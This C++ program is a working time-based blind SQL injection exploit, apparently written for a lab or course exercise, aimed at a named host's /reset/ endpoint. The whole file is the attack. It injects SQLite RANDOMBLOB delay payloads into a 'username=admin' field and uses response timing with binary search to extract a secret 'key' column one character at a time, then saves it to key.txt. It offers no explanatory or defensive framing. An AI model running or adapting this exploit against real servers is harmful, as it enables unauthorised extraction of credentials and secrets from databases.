#include <curl/curl.h>
#include <chrono>
#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <numeric>
#include <fstream>
#include <random>

using namespace std;

double duration = 1;

int get_random_num() {
    static random_device rd;
    static mt19937 gen(rd());
    static uniform_int_distribution<> dis(1000, 9999);
    return dis(gen);
}

string sleep(double sleeptime = 1) {
    return to_string(get_random_num()) + "=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(" + to_string((int) (sleeptime * 100000000 / 2)) + "))))";
}

double measure_request(const string& postFields) {
    CURL *curl = curl_easy_init();
    if (!curl) return measure_request(postFields);

    curl_easy_setopt(curl, CURLOPT_URL, "http://lbs-2026-02.askarov.net:3030/reset/");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, +[](char* ptr, size_t size, size_t nmemb, void*) {
        return size * nmemb;
    });

    auto start = chrono::high_resolution_clock::now();
    CURLcode res = curl_easy_perform(curl);
    auto end = chrono::high_resolution_clock::now();

    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK) {
        cerr << "CURL error: " << curl_easy_strerror(res) << "\n";
        return measure_request(postFields);
    }
    
    return chrono::duration<double>(end - start).count();
}

bool is_true(const string& condition) {
    string postFields = "username=admin' and " + condition + " and " + sleep(2 * duration) + "--";
    // cout << condition << "\n";

    double new_duration = measure_request(postFields);
    bool res = (new_duration < 1.5 * duration);
    duration = new_duration;
    // cout << "duration: " << duration << "\n";
    if (res) {
        return false;
    }
    return !is_true("NOT (" + condition + ")");
}

int main() {
    auto start_decryption = std::chrono::high_resolution_clock::now();

    string key = "";

    int i = 1;
    while (!is_true("key = '" + key + "'")) {
        // cout << "\n=== Finding character at position " << i << " ===\n";

        // Better character search (binary search over ASCII range)
        int low = 0, high = 127;  // Printable ASCII range
        while (low < high) {
            int mid = (low + high) / 2;
            if (is_true("unicode(substr(key, " + to_string(i) + ", 1)) <= " + to_string(mid)))
                high = mid;
            else
                low = mid + 1;
        }

        key += static_cast<char>(low);
        cout << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "\n" << "Key: '" << key << "'\n\n";
        auto current_end = std::chrono::high_resolution_clock::now();
        double current_duration_seconds = std::chrono::duration<double>(current_end - start_decryption).count();
        cout << "Decrypted " << i << " characters for " << (int) current_duration_seconds << " seconds." << "\n\n";
        i++;
    }

    auto end_decryption = std::chrono::high_resolution_clock::now();
    double duration_seconds = std::chrono::duration<double>(end_decryption - start_decryption).count();

    cout << "Found key: '" << key << "'\n";
    cout << "Decryption lasted " << (int) duration_seconds << " seconds." << "'\n";

    // Write to file
    std::ofstream outfile("key.txt");
    outfile << key;
    outfile.close();

    return 0;
}